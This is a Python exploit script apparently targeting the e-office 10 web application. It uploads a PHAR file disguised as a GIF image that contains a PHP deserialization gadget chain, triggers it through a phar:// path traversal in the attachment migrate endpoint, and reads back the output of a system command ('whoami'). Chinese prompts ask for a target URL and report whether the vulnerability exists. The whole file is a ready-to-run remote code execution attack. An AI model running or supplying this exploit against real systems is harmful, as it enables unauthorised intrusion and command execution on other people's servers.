import requests
import base64
import re

def exploit(url):

    file_content = "R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQonAQAAAQAAABEAAAABAAAAAADxAAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTM6IgAqAGNvbm5lY3Rpb24iO3M6Njoid2hvYW1pIjt9fQgAAAB0ZXN0LnR4dAQAAACrZQtmBAAAAAx+f9i2AQAAAAAAAHRlc3QkO7QWt6Sl9xEOb4U0l7CNmuxVowIAAABHQk1C"
    decoded_file = base64.b64decode(file_content)
    mkbt = decoded_file.decode('latin-1')
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"

    url1 = f"{url}/eoffice10/server/public/api/attachment/atuh-file"
    headers1 = {
        "User-Agent": ua,
        "Content-Type": "multipart/form-data; boundary=mkbk",
    }
    data1 = f"--mkbk\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\r\nContent-Type: image/jpeg\r\n\r\n{mkbt}\r\n--mkbk--"
    response1 = requests.post(url1, headers=headers1, data=data1)


    match = re.search(r'"attachment_id":"(.*?)"', response1.text)
    attachment_id = match.group(1) if match else None

    url2 = f"{url}/eoffice10/server/public/api/attachment/path/migrate"
    headers2 = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data2 = "source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F"
    response2 = requests.post(url2, headers=headers2, data=data2)

    url3 = f"{url}/eoffice10/server/public/api/empower/import"
    headers3 = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data3 = f"type=mkbk&file={attachment_id}"
    response3 = requests.post(url3, headers=headers3, data=data3)

    
    if response3.status_code == 200:
      
        pattern = r'(?<=})[^}]+$'
        match = re.search(pattern, response3.text)
        if match:
            extracted_str = match.group()
            print(f'漏洞存在 命令执行结果为: {extracted_str}')
        else:
            print('漏洞不存在')
    else:
        print("漏洞不存在.")
        print(response3.text)

if __name__ == "__main__":
    target_url = input("请输入URL结尾不能带/: ")
    exploit(target_url)
